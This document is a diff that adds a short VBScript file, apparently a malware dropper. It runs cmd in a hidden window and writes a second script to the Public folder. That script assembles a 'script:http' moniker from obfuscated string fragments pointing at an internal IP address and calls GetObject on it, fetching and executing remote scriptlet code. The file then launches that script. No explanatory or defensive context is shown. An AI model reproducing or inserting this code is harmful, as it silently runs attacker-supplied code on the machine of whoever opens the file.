@@ -1,0 +1,13 @@
+﻿CreateObject("Wscript.Shell").Run "cmd /c (" & _
+"echo UJa50=""tp"" & " & _
+"echo Z0wH12=""ri"" & " & _
+"echo. & " & _
+"echo tbvD42=""."" & " & _
+"echo Y6aS81=""sC"" ^& Z0wH12 ^& ""pt:ht"" ^& UJa50 ^& ""://"" & " & _
+"echo Y6aS81=Y6aS81 ^& ""192.168.0.24/vb/"" & " & _
+"echo. & " & _
+"echo GetObject^(Y6aS81^)" & _
+") > %Public%\MuYP97.vbs", 2, TRUE
+CreateObject("Wscript.Shell").Run "cmd /V/D/c start %Public%\MuYP97.vbs", 2, TRUE
+
+close
